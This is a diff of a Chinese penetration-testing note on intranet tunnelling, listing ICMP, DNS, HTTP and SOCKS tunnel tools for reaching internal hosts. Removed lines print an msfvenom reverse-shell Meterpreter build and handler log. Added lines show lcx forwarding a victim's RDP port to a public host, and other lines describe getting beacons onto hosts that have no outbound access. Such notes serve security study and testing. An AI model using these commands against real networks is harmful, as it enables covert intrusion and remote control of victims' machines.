@@ -1,6 +1,8 @@
 # 内网穿透-隧道
 
 > [渗透测试之内网渗透（二）：内网穿透_渗透测试内网穿透各类工具使用情况-CSDN博客](https://blog.csdn.net/m0_74131821/article/details/130322657)
+>
+> [内网渗透系列：内网穿透（隧道）学习_隧道内网穿透-CSDN博客](https://blog.csdn.net/weixin_44604541/article/details/118305353)
 
 ## 1. 内网穿透概述
 
@@ -96,33 +98,6 @@ ssh -p 22 user@ip   #试一下就知道了
 
 
 
-### 1.3 端口映射和端口转发
-
-#### (1) 端口映射
-
-端口映射的使用，以下图为例，这是一个在渗透测试中，比较常见的场景：
-
-一个hacker通过扫描暴露到公网中的主机A ，主机A开放了一些敏感端口，而且是弱口令，导致主机A被hacker完全控制。
-接着hacker就想往公司内网中渗透，通过在主机A监控流量或者扫描的方式，发现了主机B，但是主机B只能由主机A进行访问，开放了80端口，而且没有公网IP。
-如果hacker想直接访问主机B的 80端口，对上面的Web服务进行继续渗透，这就需要进行端口映射，让hacker可以远程连接到80端口。
-
-从上图场景中看，端口映射是将内网主机B的80端口映射到了具有公网IP的主机A上，本质上是将一个本来无法访问的端口映射到可以访问的IP上了
-
-#### (2) 端口转发
-
-端口转发又是另外一个场景，在渗透测试中，也很常见。如下图所示：
-
-hacker位于主机A，主机A可能是个人电脑，也可能是hacker控制的主机。
-hacker通过发送恶意邮件的方式给主机B，主机B的用户点开邮件，运行恶意木马导致主机B被感染，就成了我们俗称的“肉鸡”。虽然已经有木马运行在主机B中，但是由于主机B不在公网中，hacker无法访问到主机B。
-主机B运行着ssh服务，开放着22端口，hacker如果想在主机A上直接连接主机B的22端口，执行shell命令，这就需要端口转发。
-
-
-这就需要一台主机C，一个公网的VPS（去阿里云或者腾讯云买）
-
-木马的服务端运行在主机C，同时监听两个端口 port1 与port2
-木马的客户端运行在主机B，分别主动连接主机B的22端口和主机C的port2
-hacker只需要主动连接主机C的port1，这样就打通了到主机B 22端口的线路
-
 ## 2. 隧道工具
 
 ### 2.1 网络层隧道工具
@@ -188,260 +163,87 @@ TCP、UDP、socks5 over ICMP，速度快，连接稳定，跨平台，client模�
 
 创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用
 
-#### (3)上线仅ICMP协议出网的内网主机
 
-通过某种信道获取了内网主机的shell，但是当前信道不适合做远控（比如站库分离的网站，我们通过SQL注入获取了数据库服务器的shell，但是数据库服务器只有ICMP协议可以出网）
-
-ICMP协议可以出网，可以利用ICMP协议，构建反向的TCP over ICMP隧道或者SOCKS over ICMP隧道上线远控平台。搭建隧道的工具使用pingtunnel，它能通过ICMP隧道转发TCP、UDP、socks5连接
-
-
-
-##### ICMP隧道转发socks上线metasploit
-
-* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
-
-```shell
-./pingtunnel -type server -noprint 1 -nolog 1
-```
-
-ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
-
-```shell
-pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
-# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
-# icmpserver_ip 192.168.1.10
-```
-
-生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
-
-```shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=c2_server_ip LPORT=8443 HttpProxyType=SOCKS HttpProxyHost=127.0.0.1 HttpProxyPort=6688 -f exe -o meterpreter.exe
-# c2_server_ip 192.168.1.10
-```
-
-启动msf监听，等待meterpreter执行上线
-
-```
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
-payload => windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set lhost 0.0.0.0
-lhost => 0.0.0.0
-msf6 exploit(multi/handler) > set lport 8443
-lport => 8443
-msf6 exploit(multi/handler) > run
-
-[*] Started reverse TCP handler on 0.0.0.0:8443 
-[*] Sending stage (200774 bytes) to 192.168.1.11
-[*] Meterpreter session 2 opened (192.168.1.10:8443 -> 192.168.1.11:49967) at 2024-01-15 02:39:34 -0500
-
-meterpreter > getuid
-Server username: ECHO0D-WIN\echo0d
-```
-
-![image-20240115154056893](./img/Intranet_tunnel/image-20240115154056893.png)
-
-![image-20240115154019407](./img/Intranet_tunnel/image-20240115154019407.png)
-
-##### ICMP隧道转发socks上线cobaltstrike
-
-* 准备好一个具有公网IP的服务器，root权限运行以下命令，启动ICMP隧道服务端
-
-```
-./pingtunnel -type server -noprint 1 -nolog 1
-```
-
-ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
-
-```
-pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
-
-# 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
-```
-
-* cobaltstrike创建listener
-  这里的代理可以是socks或者HTTP，好像cobaltstrike不支持socks5代理，这里并不能成功上线
-  这里也可以使用HTTP代理，不过需要工具将HTTP代理转为socks5代理，比如privoxy
-
-* 选择创建的listener生成beacon上传到目标执行即可上线
 
 ### 2.1 传输层隧道工具
 
-（1）netcat
-官网：https://eternallybored.org/misc/netcat/
+#### (1) 使用场景
 
-网络工具中的瑞士军刀，不多介绍，linux系统一般自带
+* 内网IP无法直接访问
 
-（2）powercat
-github：https://github.com/besimorhino/powercat
+* 只有特定端口出网
 
-powershell版的netcat
+#### (2) 传输层隧道工具
 
-（3）socat
-github：https://github.com/erluko/socat
+* netcat
 
-具有记录转发流的功能，方便查看转发内容，需要安装
+  官网：https://eternallybored.org/misc/netcat/
 
-（4）netsh
-官网：https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts
+* powercat（powershell版的netcat）
 
-windows系统自带的网络配置工具
+  github：https://github.com/besimorhino/powercat
 
-（5）lcx
-github：https://github.com/windworst/LCX
+* socat
 
-基于socket套接字实现的端口转发工具，从linux下的htran移植给Windows的
+  具有记录转发流的功能，方便查看转发内容，需要安装
 
+  github：https://github.com/erluko/socat 
+
+* netsh
+
+  windows系统自带的网络配置工具
+
+  官网：https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts  
+
+* lcx
+
+  github：https://github.com/windworst/LCX
+
+  下面是几条常用命令记录：
+
+```shell
+# 将lcx.exe上传到受害者主机上（内网机器192.168.1.123），将其3389端口转发到一个公网IP的8080端口。
+lcx.exe -slave 11.11.11.11 8080 192.168.1.123 3389
+# 将本机端口8080上监听的所有数据转发到本机9000上
+lcx.exe -listen 8080 9000
+# 此时攻击者访问127.0.0.1:9000即可访问到内网的远程桌面，从而突破了内网私有ip的限制。
+
+# 将本机端口9000上监听的所有数据转发到192.168.1.123的8080。跳板机上执行一下，可以直接访问到内网的对应站点了
+lcx.exe -tran 9000 192.168.1.123 8080
 ```
-//内网机器10.0.0.1的3389端口，转发到公网9000端口
-lcx.exe -slave 192.168.1.161 9000 10.0.0.1 3389 
 
-//公网机器192.168.1.1，将本机端口9000上监听的所有数据转发到本机5555上
-lcx.exe -listen 9000 5555
-```
+* NATBypass
 
-（6）NATBypass
-github：https://github.com/cw1997/NATBypass
+  一款lcx在golang下的实现，命令和上面的lcx一样
 
-一款lcx在golang下的实现,更好的跨平台，更完善的文档
+  github：https://github.com/cw1997/NATBypass   
 
-（7）iox
-github：https://github.com/EddieIvan01/iox
+* iox
 
-端口转发 & 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台
+  端口转发 & 内网代理工具，功能类似于lcx/ew，**简化了命令行参数**，支持UDP流量转发，支持流量加密。不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险
 
-缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险
+  github：https://github.com/EddieIvan01/iox
 
-（8）frp
-github：https://github.com/fatedier/frp
+* frp
 
-用Go写的，支持TCP和UDP，以及HTTP和HTTPS协议，同时也支持P2P，仍在持续更新
+  用Go写的，支持TCP、UDP、HTTP、HTTPS协议，同时也支持P2P，仍在持续更新
+
+  github：https://github.com/fatedier/frp
+
+
 
 ### 2.3 应用层隧道工具
 
+#### (1) 使用场景
+
+特定的应用层协议出网，主要还是DNS隧道和socks代理
+
+#### (2) 应用层隧道工具
+
 由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等
 
-（1）dnscat2
-github：https://github.com/iagox86/dnscat2
-
-IP over DNS通过 DNS 协议创建加密的命令和控制 (C&C) 通道，看起来厉害极了
-
-可参考：
-
-https://cloud.tencent.com/developer/article/1474644?from=article.detail.1552172
-https://cloud.tencent.com/developer/article/1419096
-（2）dnscat2-powershell
-github：https://github.com/lukebaggett/dnscat2-powershell
-
-dnscat2的powershell客户端
-
-（3）dns2tcp 使用文档
-github：https://github.com/alex-sector/dns2tcp
-
-TCP over DNS，即通过DNS隧道转发TCP连接，没有加密。采用直连，但速度不是特别乐观，优势在于kali直接集成了这个工具，部分linux发行版也都可以直接通过包工具下载，相对方便
-
-可参考： https://cloud.tencent.com/developer/article/1552172?from=article.detail.1419096
-
-（4）iodine
-github：https://github.com/yarrick/iodine
-
-IPv4 over DNS，即通过DNS隧道转发IPv4数据包，在编码，请求类型上提供了更丰富的选择，而且在速度方面更快
-
-可参考： https://cloud.tencent.com/developer/article/1552172?from=article.detail.1419096
-
-（5）reGeorg
-github：https://github.com/sensepost/reGeorg
-
-SOCKS over HTTP，即通过HTTP隧道转发SOCKS，用Python写的，基于Python2.7和urllib3，上传一个Tunnel脚本，然后远程连接转发端口即可建立socket代理隧道
-
-对于aspx的网站假如总是报错，可以尝试ashx脚本
-PHP程序确认php.ini中socket模块正常开启并且可用，reGeorge也提供了nosocket脚本
-linux下利用proxychains，Windows下利用proxifier实现任意应用通过代理
-假如绑定某些端口会遇到socket无法建立连接时，尝试着利用80、53等穿透性强的端口
-（6）Neo-reGeorg
-github：https://github.com/L-codes/Neo-reGeorg
-
-重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃
-
-根据作者说法：
-
-传输内容经过变形 base64 加密，伪装成 base64 编码
-直接请求响应可定制化 (如伪装的404页面)
-HTTP Headers 的指令随机生成，避免特征检测
-HTTP Headers 可定制化
-自定义 HTTP 响应码
-多 URL 随机请求
-服务端 DNS 解析
-兼容 python2 / python3
-服务端环境的高兼容性
-(仅 php) 参考 pivotnacci 实现单 Session 创建多 TCP 连接，应对部分负载均衡场景
-aspx/ashx/jsp/jspx 已不再依赖 Session，可在无 Cookie 等恶劣环境正常运行
-支持内网转发，应对负载均衡环境
-（7）reDuh
-github：https://github.com/sensepost/reDuh
-
-TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定
-
-（8）Tunna
-github：https://github.com/SECFORCE/Tunna
-
-TCP、SOCKS over HTTP，即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定
-
-（9）ABPTTS
-github：https://github.com/nccgroup/ABPTTS
-
-TCP over HTTP，即通过HTTP隧道转发TCP连接
-
-数据加密，可自定义HTTP数据
-对抗特征检测十分优秀
-创建的隧道十分稳定
-比较遗憾的是支持的web脚本类型只有aspx和jsp
-（10）EarthWorm（EW）
-官网：http://rootkiter.com/EarthWorm/
-github：https://github.com/rootkiter/Binary-files
-下载：https://github.com/rootkiter/Binary-files/tree/bd3223082afbf88421fe391eb55b9eb2da7d533e
-
-十分方便的多级SOCKS代理，已经永久停止更新，五种管道：
-
-ssocksd : 正向代理
-rssocks : 反向代理
-lcx_slave： 该管道一侧通过反弹方式连接代理请求，另一侧连接代理提供主机
-lcx_tran : 该管道通过监听本地端口代理请求，并转发给代理提供主机
-lcx_listen : 该管道通过监听本地端口接收数据，并将其转发给目标网络回连的代理提供主机
-（11）Termite
-官网：http://rootkiter.com/Termite/
-github：https://github.com/rootkiter/Binary-files/tree/bd3223082afbf88421fe391eb55b9eb2da7d533e
-
-EarthWorm的升级版，已经永久停止更新
-
-（12）Venom
-github：https://github.com/Dliv3/Venom/
-
-Venom是一款基于ssh隧道，为渗透测试人员设计的使用Go开发的多级代理工具
-
-据作者说：
-
-可视化网络拓扑
-多级socks5代理
-多级端口转发
-端口复用 (apache/mysql/…)
-ssh隧道
-交互式shell
-文件的上传和下载
-节点间通信加密
-支持多种平台(Linux/Windows/MacOS)和多种架构(x86/x64/arm/mips)
-（13）ssocks
-github：https://github.com/54Pany/sSocks
-
-正向和反向的socks工具，可执行文件的大小很小，支持socks5验证，支持IPV6和UDP
-
-（14）s5.go
-github：https://github.com/ring04h/s5.go
-
-go语言编写的socks服务工具，良好的跨平台特性
-
-（15）ssh
-ssh本身可以用来做隧道，如果没被限制的话
+* **ssh**
+  ssh本身可以用来做隧道，如果没被限制的话
 
 本地转发：
 
@@ -477,26 +279,134 @@ ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1
 -p 指定ssh连接端口
 ```
 
-## 三、内网穿透场景
+* **dns2tcp**
 
-### 1、上线零出网的内网主机
+  **实际使用记录**：[DNS隧道-dns2tcp](https://echo0d.github.io/DailyNotes/AD/Tools/Tunnel.html#_2-2-dns2tcp)
 
-#### （1）背景
+  TCP over DNS，即通过DNS隧道转发TCP连接，没有加密。采用直连，但速度不是特别乐观，优势在于kali直接集成了这个工具，部分linux发行版也都可以直接通过包工具下载，相对方便
 
-获取了webshell的主机位于内网
+  github：https://github.com/alex-sector/dns2tcp
 
-ICMP等网络层协议不能出网
-TCP和UDP等传输层协议不能出网
-DNS、HTTP等应用层协议也不能出网
-唯一的数据通道是反向代理入网的web应用
+  可参考：https://cloud.tencent.com/developer/article/1552172?from=article.detail.1419096
 
-#### （2）方案
+* **iodine**
+
+  **实际使用记录**：[DNS隧道-iodine](https://echo0d.github.io/DailyNotes/AD/Tools/Tunnel.html#_2-1-iodine)
+
+  IPv4 over DNS，即通过DNS隧道转发IPv4数据包，在编码，请求类型上提供了更丰富的选择，而且在速度方面更快github：https://github.com/yarrick/iodine
+
+  可参考： https://cloud.tencent.com/developer/article/1552172?from=article.detail.1419096
+
+* **dnscat2**
+
+  IP over DNS通过 DNS 协议创建加密的命令和控制 (C&C) 通道
+
+  github：https://github.com/iagox86/dnscat2
+
+  可参考：https://cloud.tencent.com/developer/article/1474644?from=article.detail.1552172
+  https://cloud.tencent.com/developer/article/1419096
+
+* **dnscat2-powershell**
+
+  dnscat2的powershell客户端
+
+  github：https://github.com/lukebaggett/dnscat2-powershell
+
+* **reGeorg**
+  github：https://github.com/sensepost/reGeorg
+
+  SOCKS over HTTP，即通过HTTP隧道转发SOCKS，用Python写的，基于Python2.7和urllib3，上传一个tunnel脚本（提供了ashx, aspx, js, jsp, php），然后远程连接转发端口即可建立socket代理隧道，例如
+
+  ```
+  $ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
+  ```
+
+* **Neo-reGeorg**
+
+  重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃
+
+  github：https://github.com/L-codes/Neo-reGeorg
+
+* **reDuh**
+
+  TCP over HTTP,即通过HTTP隧道转发TCP连接
+
+  github：https://github.com/sensepost/reDuh
+
+* **Tunna**
+
+  TCP、SOCKS over HTTP，即通过HTTP隧道转发TCP连接和SOCKS
+
+  github：https://github.com/SECFORCE/Tunna
+
+* **ABPTTS**
+
+  TCP over HTTP，即通过HTTP隧道转发TCP连接
+
+  github：https://github.com/nccgroup/ABPTTS
+
+* **EarthWorm（EW）**
+
+  十分方便的多级SOCKS代理
+
+  官网：http://rootkiter.com/EarthWorm/
+
+  github：https://github.com/rootkiter/Binary-files
+
+  下载：https://github.com/rootkiter/Binary-files/tree/bd3223082afbf88421fe391eb55b9eb2da7d533e
+
+  ```
+  # 5种管道
+  ssocksd : 正向代理
+  rssocks : 反向代理
+  lcx_slave： 该管道一侧通过反弹方式连接代理请求，另一侧连接代理提供主机
+  lcx_tran : 该管道通过监听本地端口代理请求，并转发给代理提供主机
+  lcx_listen : 该管道通过监听本地端口接收数据，并将其转发给目标网络回连的代理提供主机
+  ```
+
+* **Termite**
+
+  EarthWorm的升级版，已经永久停止更新
+
+  官网：http://rootkiter.com/Termite/
+
+  github：https://github.com/rootkiter/Binary-files/tree/bd3223082afbf88421fe391eb55b9eb2da7d533e
+
+* **Venom**
+
+  Venom是一款基于ssh隧道，为渗透测试人员设计的使用Go开发的多级代理工具
+
+  github：https://github.com/Dliv3/Venom/
+
+* **ssocks**
+  github：https://github.com/54Pany/sSocks
+
+  正向和反向的socks工具，可执行文件的大小很小，支持socks5验证，支持IPV6和UDP
+
+* **s5.go**
+
+  go语言编写的socks服务工具，良好的跨平台特性
+
+  github：https://github.com/ring04h/s5.go
+
+### 2.4 上线零出网的内网主机
+
+#### (1) 背景
+
+1. 获取了webshell的主机位于内网
+
+2. ICMP等网络层协议不能出网
+3. TCP和UDP等传输层协议不能出网
+4. DNS、HTTP等应用层协议也不能出网
+5. 唯一的数据通道是反向代理入网的web应用
+
+#### (2) 方案
 
 利用反向代理入网的web应用所在的HTTP连接，构建正向的TCP over HTTP隧道。通过这条隧道，我们可以向内网主机发起TCP连接。生成bind类型的payload，通过webshell上传执行就会监听一个端口，我们的远控平台通过构建的TCP over HTTP隧道，去连接监听的端口即可上线
 
-能构建TCP over HTTP的隧道的工具有ABPTTS、Tunna、reDuh等，由于Tunna、reDuh构建的tcp连接不稳定，这里选用ABPTTS
+能构建TCP over HTTP的隧道的工具有ABPTTS、Tunna、reDuh等，这里选ABPTTS
 
-#### （3）过程
+#### (3) 过程
 
 ##### 上线metasploit
 
@@ -581,72 +491,37 @@ python abpttsclient.py -c server/config.txt -u "http://192.168.168.121/abptts.as
 
 * 生成父beacon
 
-
-
 * 上传父beacon到abptts客户端执行上线
-
-
 
 * 创建payload为TCP beacon的listener
 
-
-
 * 生成stageless的子beacon
-
-
 
 * 将生成的子beacon通过webshell上传执行
 
 ```
 # 可以通过webshell查看网络监听，确保子beacon执行成功
-
 netstat -ano | findstr 127.0.0.1:8888
 ```
 
 * 在父beacon中连接ABPTTS的监听IP和端口
 
-
-
 * 成功上线不能出网的webshell内网主机
 
 
 
-* 
+## 4. 一些总结
 
-### 3、上线仅DNS协议出网的内网主机
+>  内网穿透的本质
 
-#### （1）背景
+通过各种通信信道，无论是正向的还是反向的，实现传输层协议TCP/UDP数据包的转发，应用层协议都是基于传输层的协议实现的。例如
 
-通过某种信道获取了内网主机的shell，但是做了限制不跟外网通信
+```
+ABPTTS         +  SOCKS服务  =  reGeorg
+TCP over HTTP  +  SOCKS     =  SOCKS over HTTP
+```
 
-TCP和UDP等传输层协议不能出网
-ICMP、HTTP等应用层协议也不能出网
-只有DNS协议可以出网
+如果能通过某种通信信道远程代码执行，一定可以通过这种通信信道实现TCP/UDP 数据包的转发，即TCP/UDP over something隧道。
 
-#### （2）方案
+比如，通过sql注入获取了shell，我们也可以利用这条通信信道转发TCP/UDP 数据包，隧道客户端将TCP/UDP数据包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可。
 
-DNS协议可以出网，只允许端口53的UDP流量，就不能通过TCP搭建隧道，这种情况下我们可以通过UDP搭建DNS隧道，具体实现是通过搭建一个DNS服务器委派的子域，这个子域因为是我们自己搭建的主机，这时候就可以通过这个子域用看起来厉害极了的dnscat2搭建DNS隧道，和网络被限制的主机进行交互
-
-#### （3）过程
-
-
-
-
-
-结语
-内网穿透的本质：通过各种通信信道，无论是正向的还是反向的，实现传输层协议TCP/UDP数据包的转发，应用层协议都是基于传输层的协议实现的。比如ABPTTS + SOCKS服务 = reGeorg
-
-内网渗透中的内网穿透的条件：能通过某种通信信道远程代码执行。如果能通过某种通信信道远程代码执行，一定可以通过这种通信信道实现TCP/UDP 数据包的转发，即TCP/UDP over something隧道。如果没有现成的工具，可能需要我们自己开发。比如，通过sql注入获取了shell，我们也可以利用这条通信信道转发TCP/UDP 数据包，没有现成的工具，需要我们开发工具而已，隧道客户端将TCP/UDP 数据包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可
-
-一些有意思的东西：
-
-网络层绕过IDS/IPS的一些探索
-Domain Borrowing: 一种基于CDN的新型隐蔽通信方法
-参考：
-
-内网渗透之内网穿透
-内网渗透之DNS隧道技术
-内网渗透之主机出网OR不出网隧道搭建
-FRP 内网穿透
-内网渗透之通信隧道
-基于bro的安全场景研究测试-DNS隧道
